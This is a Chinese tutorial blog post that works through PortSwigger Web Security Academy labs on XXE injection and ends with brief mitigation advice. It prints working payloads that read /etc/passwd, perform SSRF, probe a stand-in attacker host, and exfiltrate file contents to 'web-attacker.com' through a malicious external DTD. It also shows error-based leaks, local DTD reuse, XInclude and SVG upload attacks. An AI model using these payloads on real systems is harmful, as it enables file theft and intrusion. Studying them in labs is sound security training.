> 原文链接: https://www.anquanke.com//post/id/245540 


# 梨子带你刷burpsuite官方网络安全学院靶场(练兵场)系列之服务器端漏洞篇 - XML外部实体注入(XXE)专题


                                阅读量   
                                **41598**
                            
                        |
                        
                                                                                    



[![](https://p0.ssl.qhimg.com/t01a1ddfc110c6be677.png)](https://p0.ssl.qhimg.com/t01a1ddfc110c6be677.png)



## 本系列介绍

> PortSwigger是信息安全从业者必备工具burpsuite的发行商，作为网络空间安全的领导者，他们为信息安全初学者提供了一个在线的网络安全学院(也称练兵场)，在讲解相关漏洞的同时还配套了相关的在线靶场供初学者练习，本系列旨在以梨子这个初学者视角出发对学习该学院内容及靶场练习进行全程记录并为其他初学者提供学习参考，希望能对初学者们有所帮助。



## 梨子有话说

> 梨子也算是Web安全初学者，所以本系列文章中难免出现各种各样的低级错误，还请各位见谅，梨子创作本系列文章的初衷是觉得现在大部分的材料对漏洞原理的讲解都是模棱两可的，很多初学者看了很久依然是一知半解的，故希望本系列能够帮助初学者快速地掌握漏洞原理。



## 服务器端漏洞篇介绍

> burp官方说他们建议初学者先看服务器漏洞篇，因为初学者只需要了解服务器端发生了什么就可以了



## 服务器端漏洞篇 – XML外部实体注入(XXE)专题

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AFXML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%9F"></a>什么是XML外部实体注入？

XML外部实体注入就是一种干扰应用程序处理XML数据的行为，攻击者可以利用该漏洞发动如SSRF之类的攻击从而实现某种恶意目的。

### <a class="reference-link" name="XXE%E6%BC%8F%E6%B4%9E%E6%98%AF%E6%80%8E%E4%B9%88%E4%BA%A7%E7%94%9F%E7%9A%84%E5%91%A2%EF%BC%9F"></a>XXE漏洞是怎么产生的呢？

某些应用程序在浏览器和服务器之间传输XML格式的数据，并且使用标准库或API处理这些数据，如果标准库或API解析XML数据时支持一些危险的特性时就可能存在XXE漏洞。<br>
XML外部实体是一种自定义的XML实体，它定义的值是从声明的DTD外部加载的，其允许根据文件路径或URL的内容来定义，故可以利用XXE漏洞读取敏感文件。

### <a class="reference-link" name="XML%E5%AE%9E%E4%BD%93"></a>XML实体

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AFXML%EF%BC%9F"></a>什么是XML？

XML全称是可扩展标记语言，是用来存储和传输数据的一种数据格式，结构上和HTML类似，但是XML使用的是自定义的标签名，XML在Web早期中比较流行，现在开始流行JSON格式的数据了。

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AFXML%E5%AE%9E%E4%BD%93%EF%BC%9F"></a>什么是XML实体？

XML实体是一种表示数据项的方式，比如用实体&lt; and &gt;表示符号&lt;和&gt;，XML用实体来表示XML标签。

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E6%A1%A3%E7%B1%BB%E5%9E%8B%E5%AE%9A%E4%B9%89(DTD)%EF%BC%9F"></a>什么是文档类型定义(DTD)？

DTD全称是document type definition，其可以定义XML文档的结构、它可以包含的数据类型和其他项目。DTD在XML文档开头以可选DOCTYPE节点中声明。DTD可以在文档内部(内部DTD)或从其他地方(外部DTD)加载，也可以混合加载。

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AFXML%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%9E%E4%BD%93%EF%BC%9F"></a>什么是XML自定义实体？

XML允许在DTD中自定义实体，例如<br>`&lt;!DOCTYPE foo [ &lt;!ENTITY myentity "my entity value" &gt; ]&gt;`<br>
如例所示，首先声明了一个名为foo的DTD，然后在DTD中声明了一个自定义实体，名为myentity，该自定义实体中的数据为”my entity value”，可以使用&amp;myentity引用该自定义实体中的数据。

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AFXML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%EF%BC%9F"></a>什么是XML外部实体？

XML外部实体也是一种自定义实体，它声明的在DTD之外，外部实体的声明使用SYSTEM关键字，然后指定加载实体值的URL，例如<br>`&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM "http://normal-website.com" &gt; ]&gt;`<br>
URL也可以是使用file伪协议从而加载指定的文件内容，例如<br>`&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM "file:///path/to/file" &gt; ]&gt;`<br>
XXE漏洞就是利用这种特性获取敏感文件内容或者发动如命令执行、SSRF等攻击。

### <a class="reference-link" name="XXE%E6%94%BB%E5%87%BB%E6%9C%89%E5%93%AA%E4%BA%9B%E7%B1%BB%E5%9E%8B%EF%BC%9F"></a>XXE攻击有哪些类型？
- 利用XXE获取文件内容
- 利用XXE发动SSRF攻击
- 利用XXE盲打获取带外数据
- 利用XXE盲打通过报错信息获取数据
### <a class="reference-link" name="%E5%88%A9%E7%94%A8XXE%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"></a>利用XXE获取文件内容

正如前面讲的，我们可以在DTD定义中声明一个外部实体，指定使用file伪协议的文件路径从而获取文件的内容，例如

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;
```

这样我们就可以获取到/etc/passwd的内容了。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8XXE%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"></a>配套靶场：利用XXE获取文件内容

首先我们随便进入一个商品页面，然后点击按钮触发一个post请求，然后把这个请求发到repeater里添加一个dtd引入自定义实体。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016c6df483c5f4ac71.png)

从上图来看，这是一个非常经典的利用XXE获取文件内容的例子了

### <a class="reference-link" name="%E5%88%A9%E7%94%A8XXE%E5%8F%91%E5%8A%A8SSRF%E6%94%BB%E5%87%BB"></a>利用XXE发动SSRF攻击

在前面的SSRF专题我们讲过这种攻击方式，该种攻击方式是通过XXE诱导服务器访问指定的URL从而发动SSRF攻击，例如<br>`&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"&gt; ]&gt;`

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8XXE%E5%8F%91%E5%8A%A8SSRF%E6%94%BB%E5%87%BB"></a>配套靶场：利用XXE发动SSRF攻击

构造payload的方式与上一道题类似，只不过是将URL替换为可以获取到用户敏感信息的URL

[![](https://p5.ssl.qhimg.com/t019a8509b3e58b432c.png)](https://p5.ssl.qhimg.com/t019a8509b3e58b432c.png)

从上图我们看到可以响应中反馈了很多敏感信息

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AFXXE%E7%9B%B2%E6%89%93%EF%BC%9F"></a>什么是XXE盲打？

与SQL盲注类似，就是我们无法直接从响应中获取到想要的结果，但是我们可以通过如带外的方式将结果发送到接收端的方式实现。前面讲过可以利用XXE发动SSRF攻击请求URL，我们可以将结果附在URL后面，这样在接收端就能接收到结果了。我们还可以通过触发报错信息的方式获取敏感信息。

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8%E5%B8%A6%E5%A4%96(OAST)%E6%8A%80%E6%9C%AF%E6%8E%A2%E6%B5%8BXXE%E7%9B%B2%E6%89%93"></a>使用带外(OAST)技术探测XXE盲打

如利用XXE发动SSRF攻击，带外技术通过XXE与远端服务器进行交互，从而探测是否存在XXE盲打漏洞，例如<br>`&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"&gt; ]&gt;`<br>
有些情况下，目标服务器对常规XXE攻击进行了防护，不过我们可以尝试使用XML参数实体，例如<br>`&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"&gt; %xxe; ]&gt;`

通过定义参数实体同样可以用来探测XXE盲打。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA1%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%B8%A6%E5%A4%96%E4%BA%A4%E4%BA%92%E7%9A%84XXE%E7%9B%B2%E6%89%93"></a>配套靶场1：使用带外交互的XXE盲打

像之前一样，我们抓一个post包，发到repeater，然后构造payload，将burp collaborator的地址插进去

[![](https://p1.ssl.qhimg.com/t01ded648157b95d4c2.png)](https://p1.ssl.qhimg.com/t01ded648157b95d4c2.png)

然后我们看一下burp collaborator有没有接收到发来的请求

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015c48b04f48004ed5.png)

从图中看我们接收到了，说明已经触发了带外交互

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA2%EF%BC%9A%E9%80%9A%E8%BF%87XML%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E4%BD%BF%E7%94%A8%E5%B8%A6%E5%A4%96%E4%BA%A4%E4%BA%92%E7%9A%84XXE%E7%9B%B2%E6%89%93"></a>配套靶场2：通过XML参数实体使用带外交互的XXE盲打

因为常规外部实体被禁用了，所以我们可以尝试使用参数实体，可以这样构造payload

[![](https://p2.ssl.qhimg.com/t0173481dcc640ee365.png)](https://p2.ssl.qhimg.com/t0173481dcc640ee365.png)

虽然响应是解析错误，但是我们看看burp collaborator是否能接收到发来的请求

[![](https://p1.ssl.qhimg.com/t018f23ac13f5ca9ddb.png)](https://p1.ssl.qhimg.com/t018f23ac13f5ca9ddb.png)

我们还是顺利地收到了发来的请求，说明采用参数实体的XXE盲打成功了

### <a class="reference-link" name="%E5%88%A9%E7%94%A8XXE%E7%9B%B2%E6%89%93%E6%B3%84%E6%BC%8F%E5%B8%A6%E5%A4%96%E6%95%B0%E6%8D%AE"></a>利用XXE盲打泄漏带外数据

前面我们讲过可以利用XXE盲打进行带外交互，那么我们同样可以利用这个带外交互传输更多的内容，下面我们来看这样的一个例子

```
&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY % exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'&gt;"&gt;
%eval;
%exfiltrate;
```

在本例中，我们首先声明了一个存储了敏感文件/etc/passwd内容的参数实体file，然后又声明了一个参数实体eval，里面又包含了一个参数实体exfiltrate，将参数实体file包含的数据附加在URL中发出带外请求从而泄漏带外数据。为了能成功加载上面内容，需要将内容封装成一个dtd托管在目标服务器上。例如<br><code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM<br>
"http://web-attacker.com/malicious.dtd"&gt; %xxe;]&gt;</code><br>
这样我们就可以成功在目标服务器上加载XXE盲打的payload了。这样讲可能不太明白，下面我们通过一道靶场来理解这种攻击方式。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E4%BD%BF%E7%94%A8%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8F%E5%A4%96%E9%83%A8DTD%E5%88%A9%E7%94%A8XXE%E7%9B%B2%E6%89%93%E6%B3%84%E9%9C%B2%E6%95%B0%E6%8D%AE"></a>配套靶场：使用一个恶意外部DTD利用XXE盲打泄露数据

首先我们在Exploit Server中构造恶意外部DTD，插入payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t012c0025142b42e6e1.png)

然后在漏洞点加载这个恶意外部DTD

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c27f147cf22968c2.png)

然后我们看看burp collaborator能不能接收到发来的附有文件内容的带外请求

[![](https://p0.ssl.qhimg.com/t019a77f722b5940b6e.png)](https://p0.ssl.qhimg.com/t019a77f722b5940b6e.png)

成功获取到指定的文件内容

### <a class="reference-link" name="%E9%80%9A%E8%BF%87%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8XXE%E7%9B%B2%E6%89%93%E6%B3%84%E9%9C%B2%E6%95%B0%E6%8D%AE"></a>通过报错信息利用XXE盲打泄露数据

有的时候我们可以通过触发XML解析错误将敏感信息泄漏在报错信息中，例如

```
&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY % error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
%eval;
%error;
```

从上面我们能看到加载了一个不存在的文件触发XML报错，但是后面加载的file实体指定的文件是存在的，所以XML报错信息中就能泄漏这个文件的内容了，例如

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

接下来我们通过一道在线靶场来深入理解

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E9%80%9A%E8%BF%87%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8XXE%E7%9B%B2%E6%89%93%E6%B3%84%E9%9C%B2%E6%95%B0%E6%8D%AE"></a>配套靶场：通过报错信息利用XXE盲打泄露数据

同样的，我们还是要在对方服务器创建一个恶意的外部DTD

[![](https://p3.ssl.qhimg.com/t0152f133cbc910f8e1.png)](https://p3.ssl.qhimg.com/t0152f133cbc910f8e1.png)

我们加载了一个不存在的文件以触发报错，然后我们在漏洞点加载这个恶意外部DTD

[![](https://p2.ssl.qhimg.com/t019ad8150955e694ea.png)](https://p2.ssl.qhimg.com/t019ad8150955e694ea.png)

我们成功通过报错信息泄漏敏感文件内容了

### <a class="reference-link" name="%E9%80%9A%E8%BF%87%E5%A4%8D%E7%94%A8%E6%9C%AC%E5%9C%B0DTD%E5%88%A9%E7%94%A8XXE%E7%9B%B2%E6%89%93"></a>通过复用本地DTD利用XXE盲打

之前我们XXE盲打都是通过加载外部DTD实现的，但是如果这种方法被限制了呢，其实还是有办法的，就是通过复用本地DTD，然后在本地DTD中对于加载外部实体这种做法的限制会有所放宽，致使我们又可以加载外部DTD实现XXE盲打了，所以我们可以这样构造payload

```
&lt;!DOCTYPE foo [
&lt;!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"&gt;
&lt;!ENTITY % custom_entity '
&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
%eval;
%error;
'&gt;
%local_dtd;
]&gt;
```

这段payload有点长，我们一点点来讲，这里burp直接介绍了一个内部的DTD：/usr/local/app/schema.dtd，这个内部DTD中有一个参数实体叫custom_entity，然后我们重写了这个参数实体，这里有个小知识点，在参数实体内部声明参数实体时关键字需要使用它的html编码格式，比如

```
&amp; -&gt; &amp;
' -&gt; '
```

其他的和前面利用报错信息的XXE盲打方式是一样的。这种复用本地DTD的攻击方式重点在于我们能不能找到一个这样的本地DTD，现在很多应用程序都是开源的，所以我们可以下载源码包进行查找。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E9%80%9A%E8%BF%87%E5%A4%8D%E7%94%A8%E6%9C%AC%E5%9C%B0DTD%E5%88%A9%E7%94%A8XXE%E7%9B%B2%E6%89%93"></a>配套靶场：通过复用本地DTD利用XXE盲打

因为题目中已经告知一个本地DTD：/usr/share/yelp/dtd/docbookx.dtd，里面有一个实体：ISOamso，于是我们可以构造这样的Payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013957a0d55468640d.png)

成功重写本地DTD利用XXE盲打

### <a class="reference-link" name="%E5%AF%BB%E6%89%BEXXE%E6%B3%A8%E5%85%A5%E7%9A%84%E9%9A%90%E8%97%8F%E6%94%BB%E5%87%BB%E9%9D%A2"></a>寻找XXE注入的隐藏攻击面

有些地方可以在没有传输任何XML格式的数据的情况下发动XXE攻击，例如
- XInclude攻击
- 通过文件上传的XXE攻击
- 通过修改Content-Type的XXE攻击
下面我们针对这两种隐藏的攻击方式展开讲解

### <a class="reference-link" name="XInclude%E6%94%BB%E5%87%BB"></a>XInclude攻击

有些应用程序的服务端会将从客户端接收的内容嵌入到XML文档中然后解析，这就导致因为我们无法控制整个XML文档而无法发动常规的XXE攻击，但是我们可以通过XInclude在该XML文档中构建子XML文档，想要使用XInclude我们需要引入相应的命名空间，所以XInclude攻击的payload长这样

```
&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;
```

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8XInclude%E6%B3%84%E9%9C%B2%E6%95%B0%E6%8D%AE"></a>配套靶场：利用XInclude泄露数据

前面已经介绍了XInclude的payload模板，所以我们直接在漏洞点构造相应的payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a0bc970331f6a9f2.png)

我们又一次成功地利用XXE攻击获取敏感文件内容了

### <a class="reference-link" name="%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84XXE%E6%94%BB%E5%87%BB"></a>通过文件上传的XXE攻击

有的应用程序允许上传XML格式的文件，比如office文档或SVG图像，然后这些文件也会因为在服务端解析而触发XXE攻击，下面我们通过一个靶场来深入讲解

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84XXE%E6%94%BB%E5%87%BB"></a>配套靶场：通过文件上传的XXE攻击

首先我们创建这样一个SVG图像

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t017741c20d2af6e754.png)

然后在评论功能处找到上传点

[![](https://p4.ssl.qhimg.com/t01744fdf594d335780.png)](https://p4.ssl.qhimg.com/t01744fdf594d335780.png)

上传刚才创建的SVG图像，然后发表评论，这时候头像加载的就是文件的内容

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d884b52603419d60.png)

至此，我们成功地通过上传带有XXE payload的SVG图像获取到文件内容了

### <a class="reference-link" name="%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9Content-Type%E7%9A%84XXE%E6%94%BB%E5%87%BB"></a>通过修改Content-Type的XXE攻击

大部分的POST请求的Content-Type都是表单类型(application/x-www-form-urlencoded)，但是有的应用程序允许将其修改成text/xml，这样我们就可以将报文内容替换成XML格式的内容了，例如

```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;foo&gt;bar&lt;/foo&gt;

```

### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E7%BC%93%E8%A7%A3XXE%E6%BC%8F%E6%B4%9E%E9%A3%8E%E9%99%A9%EF%BC%9F"></a>如何缓解XXE漏洞风险？

XXE漏洞主要是对XML格式的数据的错误解析，想要缓解可以通过禁用外部实体解析和禁用对XInclude的支持的方式，具体的操作流程可以参考相关的XML解析库或API。



## 总结

以上就是梨子带你刷burpsuite官方网络安全学院靶场(练兵场)系列之服务器端漏洞篇 – XML外部实体注入(XXE)专题的全部内容啦，本专题主要讲了XXE的形成原理以及各种利用方式还有缓解方法。我们还了解到利用XXE漏洞还能发动SSRF攻击，所以其危害不容忽视，感兴趣的同学可以在评论区讨论哦，嘻嘻嘻。
